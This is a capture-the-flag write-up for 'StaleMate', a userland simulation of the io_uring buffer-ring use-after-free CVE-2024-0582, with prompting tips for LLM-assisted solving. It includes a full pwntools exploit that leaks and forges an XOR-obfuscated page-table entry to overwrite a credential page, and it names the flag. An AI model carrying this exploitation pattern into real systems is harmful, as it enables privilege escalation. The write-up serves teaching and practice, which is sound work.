---
title: "StaleMate"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: pwn
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, pwn, ai-assisted]
draft: false
summary: "A userland reimplementation of the io_uring provided-buffer-ring bug (CVE-2024-0582): unregister leaves the mmap alive, so a stale mapping over a reused slot gives a UAF write to forge a page-table entry onto the cred page."
icon: "♟️"
---

## Summary

`StaleMate` is a userland simulation of the Linux io_uring "provided buffer ring" (PBUF) subsystem that faithfully models **CVE-2024-0582**: when you unregister a PBUF ring whose pages are still `mmap`'d, the kernel frees the backing block but leaves the mapping intact — a classic use-after-free. The core technique is to drive that stale mapping over a freshly reused slot, leak a XOR-obfuscated page-table token through it, then forge a PTE that points the VM at the privileged `cred` page and clear the three fields that keep `open flag` locked. This is the writeup where I lean on an LLM to do the reverse engineering and the offset bookkeeping while I supply the strategy, recognize the CVE, and catch the model's wrong turns.

I want to be honest about the division of labor up front: the LLM did the grinding — disassembly triage, recovering struct layouts, computing the splitmix64 finalizer, and grinding the proof-of-work loop. My contribution was almost entirely **prompting and judgment**: I recognized the challenge as a CVE-2024-0582 lab from the banner alone, I told the model what to look for instead of letting it wander the binary, and I caught two confident-but-wrong claims that would have sent the exploit into a dead end. The final "Lessons learned" section is the part I actually care about, because the steering is the transferable skill.

## Solution

### Recognizing the shape before touching the binary

The banner does most of the work of telling you what you're looking at:

```
pbuf-remap: tiny io_uring lab
the kernel says your mapped pbuf ring is definitely gone.
```

"your mapped pbuf ring is definitely gone" is the tell. io_uring provided buffer rings, plus the phrase "mapped … is gone," is CVE-2024-0582 almost verbatim — the bug where `IORING_UNREGISTER_PBUF_RING` releases the ring's pages while a prior `mmap` of those pages is still live, leaving a dangling mapping into freed memory. The flag itself later confirms it: `pfnmap_pbuf_pages_should_outlive_the_mmap`. So before disassembling anything, I already had the win condition in mind: **get the freed slot reused by something sensitive, then read/write it through the stale mapping.**

The menu is a near-1:1 mirror of the kernel ABI, which is the second confirmation that this is a deliberate CVE re-implementation:

```
1. IORING_REGISTER_PBUF_RING     6. create mm context
2. mmap pbuf ring                7. vm alloc user page
3. IORING_UNREGISTER_PBUF_RING   8. vm read
4. io_uring_buf_ring_add         9. vm write
5. inspect mapped ring entry    10. open flag
```

Options 1-5 are the io_uring PBUF lifecycle; options 6-9 are a second, independent abstraction (a tiny MMU with page tables); option 10 is the win gate. The whole puzzle is making abstraction A's stale mapping collide with abstraction B's page table.

### Internal model recovered by RE

This is where I handed the binary to the model and asked it to recover structures rather than narrate instructions. The internal model it reconstructed (and that I verified against behavior) is a **buddy allocator** carving a page region:

- page memory base `0x7440` — slot `i` lives at `0x7440 + i*0x1000`,
- block metadata at `0x5440`, free-lists at `0x53e0`,
- a per-slot presence/identity area.

Boot pre-allocates a handful of permanent slots. Two of them matter:

- a privileged **`cred`** object whose slot index is stored at `[0x5010]`,
- an 8-byte random **secret** at `[0x5040]`, seeded from `getrandom`.

`open flag` (option 10) reads the cred at `0x7440 + [0x5010]*0x1000` and demands all of:

```
cred[0x00] == "CREDv1"          (0x317644455243)
cred[0x08] == 0
cred[0x10] == 0
cred[0x18] == 0xffffffffffffffff
cred[0x20] == splitmix64( 0xc0ffee20240582 ^ secret )   # splitmix64 finalizer
```

### The "stalemate": one move from won

The reason the challenge is named StaleMate (beyond the obvious pun on "stale mapping") is the boot state of the cred. It is built **almost-valid but deliberately locked**:

```
cred[0x00] = "CREDv1"                 # ok
cred[0x08] = 0x000003e8000003e8       # WRONG (check wants 0)
cred[0x10] = 0x000003e8000003e8       # WRONG (check wants 0)
cred[0x18] = 0                        # WRONG (check wants -1)
cred[0x20] = splitmix64(...)          # ALREADY CORRECT (built with the real secret)
```

The single most important insight in the whole challenge: **`cred[0x20]` is already valid.** It was computed at boot with the real secret, so we never have to leak the secret, never have to reverse splitmix64, never have to brute anything. The hash is the hard part and it is handed to us for free. All we need is a **write primitive** to set three fields:

```
cred[0x08] = 0
cred[0x10] = 0
cred[0x18] = 0xffffffffffffffff
```

That's the chess metaphor: the position is one move from won. We just need to make that one move land on the cred page.

This was also my first **dead-end correction** with the model. When I first asked it for an exploit plan, it confidently proposed leaking the 8-byte secret, recomputing the splitmix64 finalizer in Python, and writing a fresh `cred[0x20]`. That works in theory but it's strictly more work and more fragile (one wrong rotation constant and you're chasing a phantom bug for an hour). I pushed back: "the boot cred already has a valid hash field — re-read the `open flag` check and tell me the *minimum* set of bytes I must change." Once it re-read the gate it agreed the hash is untouched and the plan collapsed to three writes. Recognizing that the expensive-looking subproblem is already solved is exactly the kind of judgment the human supplies.

### The bug: a stale mmap mapping

The UAF chain across the io_uring abstraction is:

- **Option 1** `IORING_REGISTER_PBUF_RING` → buddy-allocates pages, giving slot `S`.
- **Option 2** `mmap pbuf ring` → creates a *mapping* that references slot `S`.
- **Option 3** `IORING_UNREGISTER_PBUF_RING` → **frees buddy block `S`** but **leaves the mapping intact**. This is the bug. The freed slot is now back on the free-list and will be handed to the next allocation.
- **Option 4** `io_uring_buf_ring_add` → writes through the still-live mapping → **UAF write** into whatever now occupies the reused slot.
- **Option 5** `inspect mapped ring entry` → reads through the mapping → **UAF read / leak**.

So the recipe is: register, mmap, unregister (stale mapping established over a freed slot), then make a *different* subsystem allocate into that exact slot.

### The collision: page tables reuse the freed slot

Here is where abstraction B enters. `create mm context` (option 6) builds a page table whose entries are obfuscated:

```
PTE = (phys_slot << 12 | flags) XOR token
```

where `token` is derived per-context from the secret. `vm read` / `vm write` (options 8/9) translate a virtual address to `phys_slot = (PTE XOR token) >> 12`, then access `0x7440 + phys_slot*0x1000`. A special **SLOT7** entry is written at a fixed position with `flags = 7`.

The crucial layout fact (recovered by RE, verified empirically): the page that holds the SLOT7 PTE is allocated from the **same freed slot** our stale mapping covers. So `create mm context` drops a page-table page right underneath the dangling io_uring mapping. Now:

- **Option 5 (inspect, idx 3)** reads the SLOT7 PTE *through the stale mapping* → leak.
- **Option 4 (buf_ring_add)** writes a *forged* PTE *through the stale mapping* → arbitrary slot mapping.

The leak math, with the scratch slot known to be `3`:

```
leaked = SLOT7_PTE = ((scratch_slot << 12) | 7) XOR token     # scratch_slot = 3
token  = leaked XOR ((3 << 12) | 7)
```

And the kill move. Because the PTE obfuscation is a **plain XOR, not a keyed MAC**, recovering `token` is total — we can forge a PTE that decodes to any slot we want. We aim it at the **cred slot (index 1)**:

```
forged = ((1 << 12) | 7) XOR token
```

We write `forged` into the page-table page via the UAF (option 4), and now the VM's virtual address that used to map the scratch slot maps the **cred page**. `vm write` then lands directly on the cred, and we clear the three locked fields.

The XOR-not-MAC observation was my second **correction**. The model initially described the PTE token as "a per-context MAC over the slot" and concluded we'd need a forgery oracle. I asked it to show me the exact instruction sequence that combines `token` and the slot — "is it `xor`, or an actual keyed construction? paste the disasm." It came back with a single `xor` of `token` against `(slot<<12)|flags`. That's not integrity, that's obfuscation, and obfuscation you can leak is obfuscation you can forge. Calling the model on the difference between "looks cryptographic" and "is cryptographic" saved the whole approach.

### Two gotchas that actually mattered

1. **Slot identities, not addresses.** The inspect/leak entry is the *physical slot encoding* of the SLOT7 PTE, not a heap pointer. The 16-byte ring entry is packed as `addr/len/bid/resv`, and the PTE value spans the `len`/`bid`/`resv` lanes, so it has to be reassembled (`len_low | bid<<32 | resv<<48`) before XORing out the token. Treating it as a flat pointer gives garbage.
2. **The proof-of-work gate.** The remote is fronted by a redpwn-style PoW (`s.<d>.<x>` challenge → iterate `x = pow(x, 1<<1277, (1<<1279)-1) ^ 1`, `d` times). This is pure grind with zero insight, so I let the model write and own it — exactly the kind of mechanical subtask where the human should stay out of the way.

### End-to-end exploit

One clear path from challenge connection to printed flag. The slot indices (`cred`=1, `scratch`=3, ring map=0) and the inspect index (`idx=3`) are the load-bearing constants recovered above.

```python
#!/usr/bin/env python3
# StaleMate / V1t CTF 2026 -- CVE-2024-0582 (io_uring PBUF stale mmap UAF), userland sim.
# usage: python3 expl.py remote      (or 'local' against ./pbuf_remap)
import sys
from pwn import remote, process, log

HOST, PORT = "pwn.v1t.site", 31337

def solve_pow(line):
    # redpwn-style PoW: "s.<d>.<x>"; iterate d times:
    #   x = pow(x, 1<<1277, (1<<1279)-1) ^ 1 ; answer = str(x_final)
    _, d_s, x_s = line.strip().split(".")
    d, x, mod = int(d_s), int(x_s), (1 << 1279) - 1
    for _ in range(d):
        x = pow(x, 1 << 1277, mod) ^ 1
    return str(x)

io = remote(HOST, PORT) if (len(sys.argv) > 1 and sys.argv[1] == "remote") else process("./pbuf_remap")

# proof-of-work gate (remote only)
line = io.recvline().decode()
if line.startswith("s."):
    io.sendlineafter(b"solution: ", solve_pow(line).encode())

def menu(opt):
    io.sendlineafter(b"> ", str(opt).encode())

# --- io_uring PBUF abstraction (options 1-5) ---
def reg(bgid, entries, flags):                  # option 1
    menu(1)
    io.sendlineafter(b"bgid: ",    str(bgid).encode())
    io.sendlineafter(b"entries: ", str(entries).encode())
    io.sendlineafter(b"flags: ",   str(flags).encode())

def mmap_ring(bgid):                            # option 2
    menu(2); io.sendlineafter(b"bgid: ", str(bgid).encode())

def unreg(bgid):                                # option 3
    menu(3); io.sendlineafter(b"bgid: ", str(bgid).encode())

def buf_ring_add(m, idx, addr, ln, bid, resv):  # option 4 (UAF write)
    menu(4)
    io.sendlineafter(b"map: ",  str(m).encode())
    io.sendlineafter(b"idx: ",  str(idx).encode())
    io.sendlineafter(b"addr: ", str(addr).encode())
    io.sendlineafter(b"len: ",  str(ln).encode())
    io.sendlineafter(b"bid: ",  str(bid).encode())
    io.sendlineafter(b"resv: ", str(resv).encode())

def inspect(m, idx):                            # option 5 (UAF read) -> 16-byte entry
    menu(5)
    io.sendlineafter(b"map: ", str(m).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    vals = {}
    for k in (b"addr", b"len", b"bid", b"resv"):
        io.recvuntil(k + b"=")
        vals[k.decode()] = int(io.recvline().strip(), 0)
    return vals

# --- tiny MMU abstraction (options 6-9) ---
def mm_ctx():                                   # option 6 -> reuses freed slot
    menu(6)

def vm_write(vm, va, data):                     # option 9
    menu(9)
    io.sendlineafter(b"vm: ",  str(vm).encode())
    io.sendlineafter(b"va: ",  str(va).encode())
    io.sendlineafter(b"len: ", str(len(data)).encode())
    io.sendafter(b"data: ", data)

# 1) Establish the stale mapping: register -> mmap -> unregister.
#    After unregister the buddy slot S is freed but the mapping over it is alive.
reg(bgid=1, entries=256, flags=1)
mmap_ring(bgid=1)
unreg(bgid=1)

# 2) Reuse the freed slot: the mm-context page table lands on slot S,
#    placing the SLOT7 PTE directly under our stale mapping.
mm_ctx()

# 3) UAF read: leak the SLOT7 PTE through the stale mapping (inspect idx 3).
#    The PTE value spans the len/bid/resv lanes of the 16-byte ring entry.
e = inspect(m=0, idx=3)
slot7 = (e["len"] & 0xFFFFFFFF) | (e["bid"] << 32) | (e["resv"] << 48)

# PTE = (slot<<12 | flags) XOR token ; scratch slot is the known constant 3, flags 7.
token = slot7 ^ ((3 << 12) | 7)
log.success(f"leaked SLOT7 PTE = {slot7:#x}")
log.success(f"recovered token  = {token:#x}")
assert (token ^ slot7) & 0xFFF == 7, "lane reassembly / XOR model is wrong"

# 4) UAF write: forge a PTE that decodes to the cred slot (index 1).
forged = ((1 << 12) | 7) ^ token
log.info(f"forged cred PTE  = {forged:#x}")
buf_ring_add(m=0, idx=1, addr=forged, ln=0, bid=0, resv=0)

# 5) The VM's va now maps the cred page. Clear the three locked fields:
#    cred[0x08]=0, cred[0x10]=0, cred[0x18]=0xffffffffffffffff.
#    cred lives at va offset 0x2008 in this context's mapping.
vm_write(vm=0, va=0x2008, data=b"\x00" * 16 + b"\xff" * 8)

# 6) cred[0x20] hash was already valid at boot -> open flag now passes.
menu(10)
io.interactive()
```

Running `python3 expl.py remote` solves the PoW, establishes the stale mapping, collides the page table onto the freed slot, leaks the token, forges the cred PTE, clears the three fields, and the boot-valid hash carries us through the gate — `open flag` prints `v1t{...}`.

## Flag

```
v1t{pfnmap_pbuf_pages_should_outlive_the_mmap}
```

The flag spells out the root cause of CVE-2024-0582 precisely: the PFN-mapped PBUF pages must out-live the `mmap`. Unregistering the ring while pages are still mapped is the use-after-free — the pages should not be freed until the last mapping is gone.

## Lessons learned - prompting the AI

**The class: a userland-CTF reimplementation of a named kernel CVE.** Whenever a pwn challenge ships a menu-driven binary whose options read like a kernel ABI (`IORING_*`, `bpf(2)`, `setxattr`, `msg_msg`, `userfaultfd`, page-table/MMU verbs) and whose banner hints at a lifetime bug ("freed but still mapped," "dangling," "stale," "after close"), you are almost certainly looking at a CVE lab — someone re-implemented a real kernel UAF/double-free/type-confusion in userland with a clean win-gate bolted on. The prompts below are written for *that whole class*, not just StaleMate; they transfer to the next io_uring/msg_msg/dirty-pagetable lab you meet.

**1. Open by naming the CVE/subsystem and forcing an ABI-to-menu map.** Don't let the model free-explore the disassembly — give it the target and make it pattern-match. The single most effective opener for this class:

> "This menu-driven pwn binary imitates a kernel subsystem; the banner mentions `<paste banner>`. I believe it's a userland reimplementation of `<CVE-XXXX / the named subsystem>`. Assume that. Produce a table: each menu option → the kernel syscall/op it imitates → whether it allocates, frees, maps, reads, or writes. Then name the single option that is the lifetime bug (UAF / double-free / stale-mapping) and the option that triggers reuse."

If you don't yet know the CVE, ask it to *propose* one: *"List the 3 most likely real kernel CVEs this menu reimplements, ranked, with the one-line bug each represents."* Naming the bug class converts a blind disassembler into a targeted pattern-matcher.

**2. Force the *minimum* win condition before any exploit work.** CTF authors in this class routinely leave the hard cryptographic/secret subproblem already-solved at boot (here, `cred[0x20]` was a valid splitmix64 hash from the start). Make the model find that before it builds anything:

> "Read the win-gate function byte by byte. List every field/condition it checks and the value each holds at boot/init. Tell me the *smallest* set of writes that flips a failing check to passing — and explicitly flag any check that is already satisfied at boot so we don't recompute it."

This is the prompt that collapsed a fragile "leak the secret + recompute the hash" plan into three plain memory writes. The transferable rule: when the model proposes expensive work (leak a key, brute a value, reverse a PRNG), ask whether the author already handed you that value.

**3. Make it prove "cryptographic" claims with opcodes.** This class is full of values that *look* like MACs/hashes/signatures but are plain XOR/add obfuscation you can leak-then-forge. Never accept the prose label:

> "Don't tell me what `<token/cookie/PTE/canary>` *is* — paste the exact disassembly that combines it with the data. Is it a single `xor`/`add`, or a real keyed construction (AES/SipHash/HMAC)? If it's reversible, give me the forge formula."

A leakable XOR is a forgeable XOR; that one distinction is the difference between "need an oracle" and "forge anything," and it decides the entire exploit shape.

**Tell the model what to focus on — and the classic dead-ends of this class to avoid up front:**
- Focus on: the alloc→free→reuse ordering of the buggy primitive, which *other* subsystem you can steer into the freed slot, and the exact lane/offset layout of leaked structs.
- Avoid (this class burns hours here): do **not** leak a secret or reverse a PRNG/hash that the author left already-valid at boot — check the win-gate's init state first. Do **not** treat structured leaks (ring entries, msg_msg bodies, PTEs) as flat pointers — they're packed across fields and must be reassembled before any XOR/shift. Do **not** over-engineer the PoW — it's almost always a known redpwn/kctf loop, hand it to the model whole. Do **not** assume slot/cache reuse is deterministic without a spray — but here it was, so verify before adding noise.

**How to verify the model's output for this class (catch hallucinations):** validate every primitive *independently* before the win-gate, and embed the checks as asserts so failures localize:
- After a leak, assert a *known* invariant of the decoded value — here, `(token ^ slot7) & 0xFFF == 7` confirms both the XOR model and the `len`/`bid`/`resv` lane order in one line. For a leaked pointer, assert it has the expected page alignment or top-byte; for a struct, assert a magic field.
- After a forged write, *re-read the target through your read primitive* before calling the win-gate, so a bad slot/offset can't be silently blamed on the gate.
- Never let `open flag` (the win-gate) be your first observation. If it fails, you must already know which primitive broke.

**Fast-path prompt recipe for this class:** *"Assume this menu binary is a userland reimplementation of CVE-XXXX / `<subsystem>`; build the option→ABI table, name the exact lifetime-bug primitive and the reuse primitive, read the win-gate and give the minimum writes (flag anything already-valid at boot), and paste the disassembly for any value you call a hash/MAC/cookie before we trust it — then we verify each primitive with an asserted invariant before touching the gate."*
